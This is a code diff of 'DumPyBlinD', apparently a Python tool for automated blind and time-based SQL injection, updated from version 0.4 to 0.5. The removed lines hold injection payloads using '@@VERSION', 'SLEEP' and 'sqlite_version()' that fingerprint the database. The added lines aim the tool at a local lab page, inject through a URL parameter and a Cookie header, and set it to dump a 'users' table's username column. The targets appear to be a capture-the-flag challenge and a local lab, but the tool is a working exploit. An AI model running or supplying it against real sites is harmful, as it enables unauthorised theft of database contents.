@@ -1,10 +1,9 @@
-#coding:utf-8
-from lib.function import *
-from lib.message import *
-from colorama import *
-init()
-
-#clear()
+from lib.dct import *
+from lib.msg import *
+from data.mysql import *
+from data.sqlite import *
+from prettytable import PrettyTable
+dump  = PrettyTable()
 
 banner = '''
 
@@ -15,168 +14,90 @@ banner = '''
                                  |_____|               
 								
 
-								'''+Fore.YELLOW+'''v 0.4'''+Fore.RESET+'''
+								'''+Fore.YELLOW+'''v 0.5 by Fuzzme'''+Fore.RESET+'''
 
 -------------------------------------------------------------------------
 
 '''
 
-postData = {'username':'admin{fuzz}','password':'x'}
-
-
-# Récupération des éléments 
-setting = {
-
-'dbms': '',
-
-'sqli_type': 'BSQLI', # Le type de SQLi TBSQLI pour time based, et BSQLI pour blind
-'url': 'http://challenge01.root-me.org/web-serveur/ch10/',# L'URL cible
-'cookies':'',
-'tofind': 'Welcome back admin',# Le mots-clées qui est retourner quand la requête retourne TRUE
-'p_time': '3',# Le temps pour le payload blind
-
-'method': 'POST',
-'postData':  postData,
-'delay': 0,
-'msg': 'No',
-
-'charset': 'azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN./0123456789_-$^^',
-'column': 'TABLE_NAME',
-'table': 'information_schema.TABLES WHERE TABLE_SCHEMA = database()',
-'startline': '0',
-'user_agent': 'DumPyBlinD v 0.4',
-
-# Ne pas toucher
-'escape': '',
-'comment': '',
-'operator': '',
-
-'http_header_post': 'No',
-'target_header' : 'X-Forwarded-For'
-	}
-
-
-# **		Affichage		**
-
 clear()
 print(banner)
-print(legalDisclaimer)
-print('\n')
+
+
+
+postData = {'id':'1{fuzz}','submit':'Envoyer'}
+headers = {'Cookie': 'IPv4=159.45.87.57{fuzz}'}
+
+
+setting = {
+	
+	'sqli_type': 'TBSQLI',
+	'method': 'GET',
+	'url': 'http://127.0.0.1/Labs/SQLi/sqlite3/sqli-3.php?id=1{fuzz}',
+	'delay': '0',
+	'timeout': 10,
+	'msg':'y',
+
+	'headers': headers,
+	'postData': postData,
+
+	'tofind':'exists',
+	'p_time': '3',
+
+
+	'dbms': '',
+	'charset': 'azertyuiopqsdfghjklmwxcvbn123456789AZERTYUIOPQSDFGHJKLMWXCVBN!.@-_+=',
+	'column':'username',
+	'table':'users',
+	'startline':'0',
+
+
+	'escape':'',
+	'comment':'',
+	'operator':'',
+	'function': ''
+}
 
 method = setting['method']
+sqli_type = setting['sqli_type']
+
 
 if method == 'POST':
-
 	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Starting DumPyBlinD with POST method')
-
 elif method == 'GET':
-
 	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Starting DumPyBlinD with GET method')
-
 else:
-	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Starting DumPyBlinD with '+setting['target_header']+' HTTP Header')
+	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Starting DumPyBlinD with  HEAD method')
 
 
-
-
-#  ** Fuzzing && déctection du back-end ** 
-
-# ** MySQL ** 
+# Blind
 
 if setting['sqli_type'] == 'BSQLI':
-
 	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] testing \'MySQL\' > AND Boolean comparaison')
 
+	if detect(setting, mysql, 'MySQL') == False:
+		print('['+Fore.GREEN+'INFO'+Fore.RESET+'] testing \'SQLite\' > AND Boolean comparaison')
+
+		if detect(setting, sqlite, 'SQLite') == False:
+			print('\n['+Fore.RED+'CRITICAL'+Fore.RESET+'] Unable to set a payload !\n')
+			exit();
+
+# Time based
+
 else:
-
 	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] testing \'MySQL\' > AND SLEEP(x)')
+	detect(setting, mysql, 'MySQL')
 
-escapeList = ['\'', '"', '']
-commentList =  ['-- -', '--+', '#', '']
-operatorList = ['AND']
+	if detect(setting, mysql, 'MySQL') == False:
+		print('['+Fore.GREEN+'INFO'+Fore.RESET+'] testing \'SQLite\' > Time Based Payload')
 
-for e in escapeList:
-	for c in commentList:
-		for o in operatorList:
+	
+		if detect(setting, sqlite, 'SQLite') == False:
+			print('\n['+Fore.RED+'CRITICAL'+Fore.RESET+'] Unable to set a payload !\n')
 
-			if setting['sqli_type'] == 'BSQLI':
-				payload = '{} {} @@VERSION=@@VERSION {}'.format(e, o, c)# Fuzzing pour les SQLi Blind
-
-			else:							  
-				payload = '{} {} SLEEP({}){}'.format(e, o, setting['p_time'], c)# Fuzzing pour les SQLi Total Blind
-
-			if Fuzz(setting, payload):
-				setting['escape'] = e
-				setting['comment'] = c
-				setting['operator'] = o
-				setting['dbms'] = 'MySQL'
-
-# ** SQLite **
-
-if setting['dbms'] == '':
-
-	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] testing \'SQLite\' > AND Boolean comparaison')
-
-	escapeList = ['\'', '"', '']
-	commentList = ['--', '']
-	operatorList = ['AND']
-
-	for e in escapeList:
-		for c in commentList:
-			for o in operatorList:
-
-				if setting['sqli_type'] == 'BSQLI':
-					payload = '{} {}  sqlite_version()=sqlite_version() {}'.format(e, o, c)
-
-					if Fuzz(setting, payload):
-						setting['escape'] = e
-						setting['comment'] = c
-						setting['operator'] = o
-						setting['dbms'] = 'SQLite'
-
-
-if setting['dbms'] != 'MySQL' and setting['dbms'] != 'SQLite':
-	print('\n['+Fore.RED+'CRITICAL'+Fore.RESET+'] Not vulnerable !\n')
-	exit();
-
-print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Target back-end is \''+setting['dbms']+'\'')
-
-# ** Récupération des information à propos du SGBD **
-if Question('Do you want get informations about target DBMS ? [y/N] : '):
-	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Trying to get informations from the taget DBMS\n')
-	if setting['dbms'] == 'MySQL':
-		GetInfo(setting, 'database()')
-		GetInfo(setting, '@@VERSION')
-		GetInfo(setting, 'current_user()')
-	else:
-		GetInfo(setting, 'sqlite_version()')
-	print('\n')
-
-
-# ** Récupération des tables et colonnes communes du SGDB **
-if Question('Do you want find commons tables and columns from the target DBMS ? [y/N] : '):
-	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Trying to find commons tables and columns from the taget DBMS\n')
-	Enumerate(setting)
-	print('\n')
-
-
-# Récupération du nombre de ligne de la colonne cible
-print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Trying to count number of rows from '+setting['column'])
-
-Rows = int(GetRows(setting))
-
-if Rows == 0:
-	print('\n['+Fore.RED+'CRITICAL'+Fore.RESET+'] Column or table not found !\n')
-	exit();
-
-
-# Dump de la colonne cible
-print('['+Fore.GREEN+'INFO'+Fore.RESET+'] '+str(Rows)+' Elements found from '+setting['column'])
-print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Data fetching start\n')
-
-
-GetData(setting, Rows)
+			exit();
 
 
 
-
+rows = int(GetRows(setting))
+GetData(setting, rows)
